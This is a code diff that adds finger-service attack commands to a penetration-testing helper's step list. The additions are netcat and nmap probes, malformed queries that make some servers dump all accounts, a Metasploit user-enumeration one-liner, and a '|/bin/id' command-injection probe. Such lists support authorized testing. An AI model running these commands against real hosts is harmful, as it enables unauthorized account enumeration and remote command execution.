@@ -5182,11 +5182,16 @@ _STEP_COMMANDS = {
         1: [
             "finger @<RHOST>",
             "finger root@<RHOST>",
+            "echo root | nc -nv <RHOST> 79   # raw banner/probe",
+            "nmap -p79 --script finger <RHOST>",
+            "finger '0'@<RHOST>; finger 'a b c d e f g h'@<RHOST>   # some fingerd dump ALL accounts",
         ],
         2: [
             "finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>",
+            "msfconsole -q -x 'use auxiliary/scanner/finger/finger_users; set RHOSTS <RHOST>; run; exit'   # uses more tricks than nmap/perl",
         ],
         3: [
+            "finger \"|/bin/id@<RHOST>\"   # legacy command-exec pass-through (rarely works, worth a try)",
             "# HackTricks Finger: https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger",
         ],
     },
